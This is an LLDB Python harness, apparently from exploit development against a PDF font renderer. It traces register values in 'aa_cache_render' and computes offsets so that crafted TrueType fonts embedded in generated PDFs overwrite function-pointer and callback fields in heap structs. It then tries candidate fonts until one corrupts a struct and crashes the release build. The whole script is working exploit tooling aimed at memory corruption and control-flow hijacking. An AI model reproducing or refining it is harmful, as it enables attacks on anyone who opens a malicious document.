# RIP-5 v2 tracer: bps BEFORE launch; two-decode flow; x27 at BOTH decodes;
# candidate grid; CHANGED diff; release-crash forensics in-session.
import os, sys, struct, subprocess, re, time
import lldb

def out(s):
    print(s); sys.stdout.flush()

t = lldb.debugger.GetSelectedTarget()
if not t or not t.IsValid():
    out("[rip5] no target"); sys.exit(1)
CWD = os.getcwd()
LOG = os.path.join(CWD, "rip5log.txt")
TRACE = open(os.path.join(CWD, "rip5_trace.txt"), "a")
def T(s):
    out(s); TRACE.write(s + "\n"); TRACE.flush()
VENVPY = os.path.join(CWD, "venv/bin/python")

def build_font(path, L):
    subprocess.run([VENVPY, "-c",
        "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('%s', %d)" % (path, L)],
        cwd=CWD, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def gen_pdf(pdf, ttf):
    subprocess.run([VENVPY, "gen_pdf.py", pdf, ttf], cwd=CWD, check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def wait_state(p, want, timeout=90):
    t0 = time.time()
    while p.GetState() == want and time.time() - t0 < timeout:
        time.sleep(0.15)
    return p.GetState()

def attempt(tag, pdf1, pdf2, ndps, want_x27):
    """launch with persistent entry bp; walk-bp dance at BOTH decodes; return dict"""
    bpe = t.BreakpointCreateByName("aa_cache_render")
    p = t.LaunchSimple([pdf1, pdf2, str(ndps), tag], None, CWD)
    if not p or not p.IsValid():
        T("[rip5] launch failed"); t.BreakpointDelete(bpe.GetID()); return None
    th = p.GetSelectedThread()
    x27s = []
    for dec in (1, 2):
        st = p.GetState()
        if st != lldb.eStateStopped:
            T("[rip5] %s dec%d: no stop (state=%d)" % (tag, dec, st)); break
        fr = th.GetSelectedFrame()
        pc = fr.GetPCAddress().GetLoadAddress(t)
        bpw = t.BreakpointCreateByAddress(pc + 1804)
        p.Continue()
        st = p.GetState()
        if st == lldb.eStateStopped:
            v = th.GetSelectedFrame().FindRegister("x27")
            x27s.append(v.GetValueAsUnsigned())
            t.BreakpointDelete(bpw.GetID())
            p.Continue()
            st = p.GetState()
        else:
            T("[rip5] %s dec%d: walk-bp miss (state=%d)" % (tag, dec, st))
            break
        if dec == 1 and st == lldb.eStateStopped and want_x27 == 1:
            break  # caller wants to stop after decode1 (unused path)
    # final continue to completion/crash
    st = p.GetState()
    if st == lldb.eStateRunning:
        st = wait_state(p, lldb.eStateRunning)  # noop guard
        while p.GetState() == lldb.eStateRunning: time.sleep(0.15)
    t.BreakpointDelete(bpe.GetID())
    res = {"x27s": x27s, "state": p.GetState(), "rc": p.GetExitStatus()}
    if res["state"] == lldb.eStateStopped:
        d = p.GetStopDescription(200)
        res["stop"] = d
        th2 = p.GetSelectedThread()
        res["bt"] = []
        for i in range(min(6, th2.GetNumFrames())):
            fr = th2.GetFrameAtIndex(i)
            res["bt"].append("%s+%s" % (fr.GetDisplayFunctionName() or "?", fr.GetPCAddress().GetLoadAddress(t)))
        v = th2.GetSelectedFrame().FindRegister("pc")
        res["pc"] = v.GetValueAsUnsigned() if v else 0
    return res

def parse_log(tag):
    txt = open(LOG, errors="replace").read()
    sec = txt.split("=== attempt %s " % tag, 1)
    if len(sec) < 2: return {}
    body = sec[1]
    d = {"addrs": [], "changed": [], "rel": [], "done": ("[%s DONE]" % tag) in body}
    m = re.search(r"\[%s ADDRS\]((?: \d+:0x[0-9a-f]+)+)" % tag, body)
    if m:
        d["addrs"] = [(int(a.split(":")[0]), int(a.split(":")[1], 16)) for a in m.group(1).split()]
    d["changed"] = re.findall(r"\[%s CHANGED\] dp(\d+) \+(0x[0-9a-f]+): ([0-9a-f]+) -> ([0-9a-f]+)" % tag, body)
    d["rel"] = [int(x) for x in re.findall(r"\[%s REL\] (\d+)" % tag, body)]
    m = re.search(r"\[%s\] diff-done changed=(\d+)" % tag, body)
    d["nchg"] = int(m.group(1)) if m else -1
    d["decoded"] = len(re.findall(r"\[%s\] decode-done" % tag, body))
    return d

open(LOG, "w").close()
T("[rip5] === probe ===")
R = attempt("p0", "k2_e64.pdf", "k2_e64.pdf", 512, 0)
T("[rip5] probe x27s=%s state=%s rc=%s stop=%s" % (
    [hex(x) for x in (R["x27s"] if R else [])], R and R["state"], R and R["rc"],
    (R.get("stop", "") if R else "")[:80]))
D = parse_log("p0")
addrs = D.get("addrs", [])
T("[rip5] dps=%d decodes=%s" % (len(addrs), D.get("decoded")))
if not R or len(R["x27s"]) < 2 or len(addrs) < 8:
    T("[rip5] probe incomplete"); sys.exit(0)
x27 = R["x27s"][1]   # strike decode's accumulator
T("[rip5] x27_1=%s x27_2=%s stable=%s" % (hex(R["x27s"][0]), hex(x27), R["x27s"][0] == x27))

# fn-ptr offsets in dp struct (from probe full dump): w9=+0x48 w10=+0x50 w12=+0x60 ; cb-ptr field +0x108
TARGETS = (0x48, 0x50, 0x60, 0x108)
cands = []
for idx, a in addrs:
    for to in TARGETS:
        off = a + to - x27
        if off != 0 and off % 64 == 0 and abs(off // 64) <= 32767:
            cands.append((abs(off // 64), idx, off // 64, to, a))
cands.sort()
T("[rip5] candidates=%d best=%s" % (len(cands),
    [("dp%d L=%d +%#x" % (c[1], c[2], c[3])) for c in cands[:6]]))

winner = None
for n, (_, dpid, L, to, a) in enumerate(cands[:14]):
    tag = "s%d" % n
    ttf = "k2_r%s.ttf" % tag; pdf = "k2_r%s.pdf" % tag
    build_font(ttf, L); gen_pdf(pdf, ttf)
    R = attempt(tag, "k2_e64.pdf", pdf, 512, 0)
    D = parse_log(tag)
    T("[rip5] %s L=%d dp=%d +%#x rc=%s decodes=%s nchg=%s changed=%s relmin=%s done=%s stop=%s" % (
        tag, L, dpid, to, R and R["rc"], D.get("decoded"), D.get("nchg"),
        D.get("changed", [])[:4], min(D["rel"]) if D.get("rel") else -1, D.get("done"),
        (R.get("stop", "") if R else "")[:80]))
    if R and R.get("state") == lldb.eStateStopped:
        T("[rip5] *** CRASH IN-SESSION pc=%s bt=%s" % (hex(R.get("pc", 0)), R.get("bt", [])[:4]))
        if D.get("changed"):
            winner = (tag, dpid, L, to, R, D)
            T("[rip5] *** WINNER: struck dp + release-crash")
            break
    if D.get("changed") and D.get("done"):
        T("[rip5] --- struck + survived release (dp corrupted, chain tolerant): %s" % tag)
if not winner:
    T("[rip5] no winner this session — candidates exhausted")
TRACE.close()
